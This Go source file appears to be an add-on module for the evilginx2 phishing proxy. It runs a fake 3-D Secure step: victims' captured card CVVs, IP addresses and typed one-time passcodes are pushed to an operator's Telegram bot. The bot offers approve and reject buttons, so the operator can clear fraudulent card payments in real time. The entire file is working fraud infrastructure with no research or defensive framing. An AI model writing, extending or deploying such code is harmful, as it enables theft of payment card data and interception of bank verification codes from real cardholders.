package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// 3DS session states
const (
	ThreeDSWaitingCVV   = "waiting_cvv_approval" // CVV captured, waiting for admin to approve/skip
	ThreeDSOTPWaiting   = "otp_waiting"          // Admin approved, waiting for user to enter OTP
	ThreeDSOTPSubmitted = "otp_submitted"        // User submitted OTP, waiting for admin review
	ThreeDSOTPRejected  = "otp_rejected"         // Admin rejected OTP, user can retry
	ThreeDSCompleted    = "completed"            // Admin approved final, user redirected
	ThreeDSExpired      = "expired"              // Timeout
)

// ThreeDSSession tracks the 3DS verification state for a single user session
type ThreeDSSession struct {
	SessionID     string // evilginx internal session ID
	State         string
	TelegramMsgID int    // Telegram message ID for editing
	OTP           string // Current submitted OTP value
	OTPCount      int    // Number of OTP submission attempts
	CreatedAt     time.Time
	UpdatedAt     time.Time
	CVV           string // Store CVV for message display
	RemoteAddr    string // Store IP for message display
	PhishletName  string // Store phishlet name for message display
	mu            sync.Mutex
}

// ThreeDSManager manages all active 3DS verification sessions
type ThreeDSManager struct {
	sessions map[string]*ThreeDSSession // sessionID -> ThreeDSSession
	mu       sync.RWMutex
	telegram *TelegramBot
	proxy    *HttpProxy
	stopChan chan struct{}
	wg       sync.WaitGroup
}

// NewThreeDSManager creates a new 3DS manager
func NewThreeDSManager(telegram *TelegramBot, proxy *HttpProxy) *ThreeDSManager {
	m := &ThreeDSManager{
		sessions: make(map[string]*ThreeDSSession),
		telegram: telegram,
		proxy:    proxy,
		stopChan: make(chan struct{}),
	}
	m.wg.Add(1)
	go m.cleanupWorker()
	return m
}

// Stop stops the 3DS manager and cleans up resources
func (m *ThreeDSManager) Stop() {
	close(m.stopChan)
	m.wg.Wait()
}

// cleanupWorker periodically cleans up expired and completed sessions
func (m *ThreeDSManager) cleanupWorker() {
	defer m.wg.Done()
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-m.stopChan:
			return
		case <-ticker.C:
			m.cleanupExpired()
		}
	}
}

// cleanupExpired removes expired and completed sessions older than 10 minutes
func (m *ThreeDSManager) cleanupExpired() {
	m.mu.Lock()
	defer m.mu.Unlock()

	now := time.Now()
	for id, ts := range m.sessions {
		ts.mu.Lock()
		state := ts.State
		updatedAt := ts.UpdatedAt
		ts.mu.Unlock()

		if state == ThreeDSExpired || state == ThreeDSCompleted {
			if now.Sub(updatedAt) > 10*time.Minute {
				delete(m.sessions, id)
				log.Debug("[3DS] cleaned up session: %s (state: %s)", id, state)
			}
		}
	}
}

// Initiate creates a new 3DS session after CVV capture
func (m *ThreeDSManager) Initiate(sessionID string, cvv string, remoteAddr string, phishletName string) *ThreeDSSession {
	m.mu.Lock()
	defer m.mu.Unlock()

	ts := &ThreeDSSession{
		SessionID:     sessionID,
		State:         ThreeDSWaitingCVV,
		TelegramMsgID: 0,
		OTP:           "",
		OTPCount:      0,
		CreatedAt:     time.Now(),
		UpdatedAt:     time.Now(),
		CVV:           cvv,
		RemoteAddr:    remoteAddr,
		PhishletName:  phishletName,
	}
	m.sessions[sessionID] = ts
	log.Info("[3DS] session initiated: %s (cvv: %s, ip: %s)", sessionID, cvv, remoteAddr)
	return ts
}

// ApproveCVV is called when admin clicks [通过] in Telegram
// Transitions to otp_waiting so user is redirected to OTP page
func (m *ThreeDSManager) ApproveCVV(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSWaitingCVV {
		ts.State = ThreeDSOTPWaiting
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] admin approved CVV for session: %s, waiting for OTP", sessionID)
		return true
	}
	return false
}

// ReleaseCVV is called when admin clicks [直接放行] at CVV stage
func (m *ThreeDSManager) ReleaseCVV(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSCompleted || ts.State == ThreeDSExpired {
		return false
	}

	ts.State = ThreeDSCompleted
	ts.UpdatedAt = time.Now()
	log.Info("[3DS] admin released session at CVV stage: %s", sessionID)
	return true
}

// SubmitOTP is called when user submits OTP from the 3DS page
func (m *ThreeDSManager) SubmitOTP(sessionID string, otp string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPWaiting || ts.State == ThreeDSOTPRejected {
		ts.OTP = otp
		ts.OTPCount++
		ts.State = ThreeDSOTPSubmitted
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] user submitted OTP for session: %s (attempt %d): %s", sessionID, ts.OTPCount, otp)
		return true
	}
	return false
}

// ApproveOTP is called when admin clicks [OTP正确] in Telegram
func (m *ThreeDSManager) ApproveOTP(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPSubmitted {
		ts.State = ThreeDSCompleted
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] admin approved OTP for session: %s", sessionID)
		return true
	}
	return false
}

// RejectOTP is called when admin clicks [OTP错误] in Telegram
func (m *ThreeDSManager) RejectOTP(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPSubmitted {
		ts.State = ThreeDSOTPRejected
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] admin rejected OTP for session: %s", sessionID)
		return true
	}
	return false
}

// GetStatus returns the current state and relevant data for a 3DS session
func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL string, otpCount int) {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return ThreeDSExpired, "", 0
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	// Check timeout (10 minutes total) - only for non-terminal states
	if ts.State != ThreeDSCompleted && ts.State != ThreeDSExpired {
		if time.Since(ts.CreatedAt) > 10*time.Minute {
			ts.State = ThreeDSExpired
			ts.UpdatedAt = time.Now()
		}
	}

	state = ts.State
	otpCount = ts.OTPCount

	// Get redirect URL from the evilginx session
	if m.proxy != nil {
		m.proxy.session_mtx.Lock()
		if s, ok := m.proxy.sessions[sessionID]; ok && s.RedirectURL != "" {
			redirectURL = s.RedirectURL
		}
		m.proxy.session_mtx.Unlock()
	}

	return
}

// --- HTTP Handlers for __3ds/* endpoints (called from http_proxy OnRequest) ---

type threeDSStatusResponse struct {
	State       string `json:"state"`
	RedirectURL string `json:"redirect_url,omitempty"`
	OTPCount    int    `json:"otp_count,omitempty"`
}

// Handle3DSStatus handles GET /__3ds/status?sid={session_id}
// Returns JSON with current 3DS state for the user's polling page
func (m *ThreeDSManager) Handle3DSStatus(req *http.Request, sessionID string) (int, string) {
	state, redirectURL, otpCount := m.GetStatus(sessionID)

	resp := threeDSStatusResponse{
		State:       state,
		RedirectURL: redirectURL,
		OTPCount:    otpCount,
	}

	jsonData, err := json.Marshal(resp)
	if err != nil {
		return http.StatusInternalServerError, `{"error":"failed to marshal response"}`
	}

	return http.StatusOK, string(jsonData)
}

type threeDSSubmitRequest struct {
	OTP string `json:"otp"`
}

type threeDSSubmitResponse struct {
	Success bool   `json:"success"`
	State   string `json:"state,omitempty"`
	Error   string `json:"error,omitempty"`
}

// Handle3DSSubmit handles POST /__3ds/submit?sid={session_id}
// User submits OTP from the 3DS page
func (m *ThreeDSManager) Handle3DSSubmit(req *http.Request, sessionID string) (int, string) {
	var submitReq threeDSSubmitRequest
	if err := json.NewDecoder(req.Body).Decode(&submitReq); err != nil {
		resp, _ := json.Marshal(threeDSSubmitResponse{Success: false, Error: "invalid request body"})
		return http.StatusBadRequest, string(resp)
	}

	if submitReq.OTP == "" {
		resp, _ := json.Marshal(threeDSSubmitResponse{Success: false, Error: "OTP is required"})
		return http.StatusBadRequest, string(resp)
	}

	ok := m.SubmitOTP(sessionID, submitReq.OTP)
	if !ok {
		resp, _ := json.Marshal(threeDSSubmitResponse{Success: false, Error: "invalid session state"})
		return http.StatusBadRequest, string(resp)
	}

	// Update Telegram message with OTP info
	m.updateTelegramOTPSubmitted(sessionID)

	state, _, _ := m.GetStatus(sessionID)
	resp, _ := json.Marshal(threeDSSubmitResponse{Success: true, State: state})
	return http.StatusOK, string(resp)
}

// --- Telegram Callback Handler ---

// HandleCallback processes Telegram inline button callbacks for 3DS
func (m *ThreeDSManager) HandleCallback(callbackData string, chatID string, msgID int) {
	// callbackData format: "3ds:action:sessionID"
	parts := strings.SplitN(callbackData, ":", 3)
	if len(parts) < 3 || parts[0] != "3ds" {
		return
	}

	action := parts[1]
	sessionID := parts[2]

	// Verify msgID matches the session's TelegramMsgID for security
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return
	}
	ts.mu.Lock()
	sessionMsgID := ts.TelegramMsgID
	ts.mu.Unlock()
	if sessionMsgID > 0 && sessionMsgID != msgID {
		log.Warning("[3DS] callback msgID mismatch for session %s: expected %d, got %d", sessionID, sessionMsgID, msgID)
		return
	}

	switch action {
	case "cvv_approve":
		// Admin clicked [通过] at CVV stage -> enter OTP flow
		if m.ApproveCVV(sessionID) {
			m.updateTelegramOTPWaiting(sessionID, msgID)
		}

	case "cvv_release":
		// Admin clicked [直接放行] at CVV stage -> skip everything
		if m.ReleaseCVV(sessionID) {
			m.updateTelegramCompleted(sessionID, msgID, "直接放行")
		}

	case "otp_approve":
		// Admin clicked [OTP正确] -> final release
		if m.ApproveOTP(sessionID) {
			m.updateTelegramCompleted(sessionID, msgID, "OTP验证通过")
		}

	case "otp_reject":
		// Admin clicked [OTP错误] -> user re-enters OTP
		if m.RejectOTP(sessionID) {
			m.updateTelegramOTPRejected(sessionID, msgID)
		}
	}
}

// --- Internal helpers ---

func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv string, ip string, phishlet string, otp string, otpCount int) {
	sIndex = -1
	cvv = "N/A"
	ip = "N/A"
	phishlet = "N/A"
	otp = ""
	otpCount = 0

	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if ok {
		ts.mu.Lock()
		cvv = ts.CVV
		ip = ts.RemoteAddr
		phishlet = ts.PhishletName
		otp = ts.OTP
		otpCount = ts.OTPCount
		ts.mu.Unlock()
	}

	if m.proxy != nil {
		m.proxy.session_mtx.Lock()
		if idx, ok := m.proxy.sids[sessionID]; ok {
			sIndex = idx
		}
		m.proxy.session_mtx.Unlock()
	}

	return
}

// updateTelegramOTPWaiting: admin approved CVV, waiting for user to enter OTP
func (m *ThreeDSManager) updateTelegramOTPWaiting(sessionID string, msgID int) {
	if m.telegram == nil || !m.telegram.IsEnabled() {
		return
	}

	sIndex, cvv, ip, phishlet, _, _ := m.getSessionInfo(sessionID)

	msg := fmt.Sprintf(
		"🔐 3DS验证中 (Session #%d)\n\n"+
			"💳 CVV: %s\n"+
			"🌐 IP: %s\n"+
			"📋 Phishlet: %s\n\n"+
			"⚙️ 状态: 等待用户输入 OTP",
		sIndex, cvv, ip, phishlet,
	)

	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
}

// updateTelegramOTPSubmitted: user submitted OTP, waiting for admin review
func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
	if m.telegram == nil || !m.telegram.IsEnabled() {
		return
	}

	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return
	}
	ts.mu.Lock()
	msgID := ts.TelegramMsgID
	ts.mu.Unlock()
	if msgID == 0 {
		return
	}

	sIndex, cvv, ip, phishlet, otp, otpCount := m.getSessionInfo(sessionID)

	msg := fmt.Sprintf(
		"🔐 3DS验证中 (Session #%d)\n\n"+
			"💳 CVV: %s\n"+
			"🌐 IP: %s\n"+
			"📋 Phishlet: %s\n\n"+
			"🔢 OTP (第%d次): %s\n\n"+
			"⚙️ 状态: 等待管理员审核",
		sIndex, cvv, ip, phishlet, otpCount, otp,
	)

	buttons := [][]InlineButton{
		{
			{Text: "✅ OTP正确", CallbackData: fmt.Sprintf("3ds:otp_approve:%s", sessionID)},
			{Text: "❌ OTP错误", CallbackData: fmt.Sprintf("3ds:otp_reject:%s", sessionID)},
		},
	}

	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, buttons)
}

// updateTelegramOTPRejected: admin rejected OTP, waiting for user retry
func (m *ThreeDSManager) updateTelegramOTPRejected(sessionID string, msgID int) {
	if m.telegram == nil || !m.telegram.IsEnabled() {
		return
	}

	sIndex, cvv, ip, phishlet, otp, otpCount := m.getSessionInfo(sessionID)

	msg := fmt.Sprintf(
		"🔐 3DS验证中 (Session #%d)\n\n"+
			"💳 CVV: %s\n"+
			"🌐 IP: %s\n"+
			"📋 Phishlet: %s\n\n"+
			"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
			"⚙️ 状态: 等待用户重新输入",
		sIndex, cvv, ip, phishlet, otpCount, otp,
	)

	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
}

// updateTelegramCompleted: final state, user will be redirected
func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, reason string) {
	if m.telegram == nil || !m.telegram.IsEnabled() {
		return
	}

	sIndex, cvv, ip, phishlet, otp, otpCount := m.getSessionInfo(sessionID)

	otpLine := ""
	if otpCount > 0 {
		otpLine = fmt.Sprintf("🔢 OTP (第%d次): %s ✅\n\n", otpCount, otp)
	}

	msg := fmt.Sprintf(
		"✅ 已放行 (Session #%d)\n\n"+
			"💳 CVV: %s\n"+
			"🌐 IP: %s\n"+
			"📋 Phishlet: %s\n"+
			"%s"+
			"⚙️ 状态: %s\n用户将被重定向",
		sIndex, cvv, ip, phishlet, otpLine, reason,
	)

	m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil)
}

// Send3DSNotification sends the initial CVV capture notification with 3DS buttons
func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
	if m.telegram == nil || !m.telegram.IsEnabled() {
		return 0
	}

	sIndex, cvv, ip, phishlet, _, _ := m.getSessionInfo(sessionID)

	msg := fmt.Sprintf(
		"🔔 新捕获! (Session #%d)\n\n"+
			"💳 CVV: %s\n"+
			"🌐 IP: %s\n"+
			"📋 Phishlet: %s\n\n"+
			"请选择操作:",
		sIndex, cvv, ip, phishlet,
	)

	buttons := [][]InlineButton{
		{
			{Text: "🔐 通过 (3DS)", CallbackData: fmt.Sprintf("3ds:cvv_approve:%s", sessionID)},
			{Text: "✅ 直接放行", CallbackData: fmt.Sprintf("3ds:cvv_release:%s", sessionID)},
		},
	}

	msgID, err := m.telegram.SendMessageWithButtons(m.telegram.chatID, msg, buttons)
	if err != nil {
		log.Error("[3DS] failed to send telegram notification: %v", err)
		return 0
	}

	// Store the message ID in the 3DS session
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if ok {
		ts.mu.Lock()
		ts.TelegramMsgID = msgID
		ts.mu.Unlock()
	}

	return msgID
}
